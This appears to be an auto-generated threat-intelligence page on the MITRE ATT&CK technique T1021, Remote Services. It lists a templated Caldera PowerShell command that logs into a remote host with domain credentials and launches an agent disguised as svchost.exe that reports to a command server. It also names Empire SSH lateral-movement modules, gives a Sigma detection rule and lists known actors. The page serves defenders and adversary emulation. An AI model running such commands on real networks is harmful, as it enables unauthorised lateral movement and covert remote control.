
# Remote Services

## Description

### MITRE Description

> An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1021

## Potential Commands

```
{'windows': {'psh': {'command': '$username = "#{domain.user.name}";\n$password = "#{domain.user.password}";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n', 'cleanup': '$username = "#{domain.user.name}";\n$password = "#{domain.user.password}";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n', 'payloads': ['sandcat.go-windows']}}}
python/lateral_movement/multi/ssh_command
python/lateral_movement/multi/ssh_command
python/lateral_movement/multi/ssh_launcher
python/lateral_movement/multi/ssh_launcher
```

## Commands Dataset

```
[{'command': {'windows': {'psh': {'cleanup': '$username = '
                                             '"#{domain.user.name}";\n'
                                             '$password = '
                                             '"#{domain.user.password}";\n'
                                             '$secstr = New-Object -TypeName '
                                             'System.Security.SecureString;\n'
                                             '$password.ToCharArray() | '
                                             'ForEach-Object '
                                             '{$secstr.AppendChar($_)};\n'
                                             '$cred = New-Object -Typename '
                                             'System.Management.Automation.PSCredential '
                                             '-Argumentlist $username, '
                                             '$secstr;\n'
                                             '$session = New-PSSession '
                                             '-ComputerName '
                                             '#{remote.host.name} -Credential '
                                             '$cred;\n'
                                             'Invoke-Command -Session $session '
                                             '-ScriptBlock{start-job '
                                             '-scriptblock{Get-Process cmd | '
                                             'Where-Object Path -eq '
                                             'C:\\Users\\Public\\svchost.exe | '
                                             'Stop-Process}};\n'
                                             'Start-Sleep -s 5;\n'
                                             'Remove-PSSession -Session '
                                             '$session;\n',
                                  'command': '$username = '
                                             '"#{domain.user.name}";\n'
                                             '$password = '
                                             '"#{domain.user.password}";\n'
                                             '$secstr = New-Object -TypeName '
                                             'System.Security.SecureString;\n'
                                             '$password.ToCharArray() | '
                                             'ForEach-Object '
                                             '{$secstr.AppendChar($_)};\n'
                                             '$cred = New-Object -Typename '
                                             'System.Management.Automation.PSCredential '
                                             '-Argumentlist $username, '
                                             '$secstr;\n'
                                             '$session = New-PSSession '
                                             '-ComputerName '
                                             '#{remote.host.name} -Credential '
                                             '$cred;\n'
                                             'Invoke-Command -Session $session '
                                             '-ScriptBlock{start-job '
                                             '-scriptblock{cmd.exe /c start '
                                             'C:\\Users\\Public\\svchost.exe '
                                             '-server #{server} -executors '
                                             'psh}};\n'
                                             'Start-Sleep -s 5;\n'
                                             'Remove-PSSession -Session '
                                             '$session;\n',
                                  'payloads': ['sandcat.go-windows']}}},
  'name': 'Start Agent using WinRM (WinRM)',
  'source': 'data/abilities/lateral-movement/41bb2b7a-75af-49fd-bd15-6c827df25921.yml'},
 {'command': 'python/lateral_movement/multi/ssh_command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/lateral_movement/multi/ssh_command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/lateral_movement/multi/ssh_launcher',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/lateral_movement/multi/ssh_launcher',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2019/01/29',
                  'description': 'Detects netsh commands that configure a port '
                                 'forwarding of port 3389 used for RDP',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['netsh i* '
                                                              'p*=3389 c*']}},
                  'falsepositives': ['Legitimate administration'],
                  'id': '782d6f3e-4c5d-4b8c-92a3-1d05fed72e63',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html'],
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement',
                           'attack.t1021',
                           'car.2013-07-002'],
                  'title': 'Netsh RDP Port Forwarding'}}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - Start Agent using WinRM (WinRM)': {'description': 'Start '
                                                                       'Agent '
                                                                       'using '
                                                                       'WinRM '
                                                                       '(WinRM)',
                                                        'id': '41bb2b7a-75af-49fd-bd15-6c827df25921',
                                                        'name': 'Start Agent '
                                                                '(WinRM)',
                                                        'platforms': {'windows': {'psh': {'cleanup': '$username '
                                                                                                     '= '
                                                                                                     '"#{domain.user.name}";\n'
                                                                                                     '$password '
                                                                                                     '= '
                                                                                                     '"#{domain.user.password}";\n'
                                                                                                     '$secstr '
                                                                                                     '= '
                                                                                                     'New-Object '
                                                                                                     '-TypeName '
                                                                                                     'System.Security.SecureString;\n'
                                                                                                     '$password.ToCharArray() '
                                                                                                     '| '
                                                                                                     'ForEach-Object '
                                                                                                     '{$secstr.AppendChar($_)};\n'
                                                                                                     '$cred '
                                                                                                     '= '
                                                                                                     'New-Object '
                                                                                                     '-Typename '
                                                                                                     'System.Management.Automation.PSCredential '
                                                                                                     '-Argumentlist '
                                                                                                     '$username, '
                                                                                                     '$secstr;\n'
                                                                                                     '$session '
                                                                                                     '= '
                                                                                                     'New-PSSession '
                                                                                                     '-ComputerName '
                                                                                                     '#{remote.host.name} '
                                                                                                     '-Credential '
                                                                                                     '$cred;\n'
                                                                                                     'Invoke-Command '
                                                                                                     '-Session '
                                                                                                     '$session '
                                                                                                     '-ScriptBlock{start-job '
                                                                                                     '-scriptblock{Get-Process '
                                                                                                     'cmd '
                                                                                                     '| '
                                                                                                     'Where-Object '
                                                                                                     'Path '
                                                                                                     '-eq '
                                                                                                     'C:\\Users\\Public\\svchost.exe '
                                                                                                     '| '
                                                                                                     'Stop-Process}};\n'
                                                                                                     'Start-Sleep '
                                                                                                     '-s '
                                                                                                     '5;\n'
                                                                                                     'Remove-PSSession '
                                                                                                     '-Session '
                                                                                                     '$session;\n',
                                                                                          'command': '$username '
                                                                                                     '= '
                                                                                                     '"#{domain.user.name}";\n'
                                                                                                     '$password '
                                                                                                     '= '
                                                                                                     '"#{domain.user.password}";\n'
                                                                                                     '$secstr '
                                                                                                     '= '
                                                                                                     'New-Object '
                                                                                                     '-TypeName '
                                                                                                     'System.Security.SecureString;\n'
                                                                                                     '$password.ToCharArray() '
                                                                                                     '| '
                                                                                                     'ForEach-Object '
                                                                                                     '{$secstr.AppendChar($_)};\n'
                                                                                                     '$cred '
                                                                                                     '= '
                                                                                                     'New-Object '
                                                                                                     '-Typename '
                                                                                                     'System.Management.Automation.PSCredential '
                                                                                                     '-Argumentlist '
                                                                                                     '$username, '
                                                                                                     '$secstr;\n'
                                                                                                     '$session '
                                                                                                     '= '
                                                                                                     'New-PSSession '
                                                                                                     '-ComputerName '
                                                                                                     '#{remote.host.name} '
                                                                                                     '-Credential '
                                                                                                     '$cred;\n'
                                                                                                     'Invoke-Command '
                                                                                                     '-Session '
                                                                                                     '$session '
                                                                                                     '-ScriptBlock{start-job '
                                                                                                     '-scriptblock{cmd.exe '
                                                                                                     '/c '
                                                                                                     'start '
                                                                                                     'C:\\Users\\Public\\svchost.exe '
                                                                                                     '-server '
                                                                                                     '#{server} '
                                                                                                     '-executors '
                                                                                                     'psh}};\n'
                                                                                                     'Start-Sleep '
                                                                                                     '-s '
                                                                                                     '5;\n'
                                                                                                     'Remove-PSSession '
                                                                                                     '-Session '
                                                                                                     '$session;\n',
                                                                                          'payloads': ['sandcat.go-windows']}}},
                                                        'tactic': 'lateral-movement',
                                                        'technique': {'attack_id': 'T1021',
                                                                      'name': 'Remote '
                                                                              'Services'}}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1021',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/lateral_movement/multi/ssh_command":  '
                                                                                 '["T1021"],',
                                            'Empire Module': 'python/lateral_movement/multi/ssh_command',
                                            'Technique': 'Remote Services'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1021',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/lateral_movement/multi/ssh_launcher":  '
                                                                                 '["T1021"],',
                                            'Empire Module': 'python/lateral_movement/multi/ssh_launcher',
                                            'Technique': 'Remote Services'}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations

None

# Actors


* [GCMAN](../actors/GCMAN.md)

* [OilRig](../actors/OilRig.md)
    
* [menuPass](../actors/menuPass.md)
    
* [APT39](../actors/APT39.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
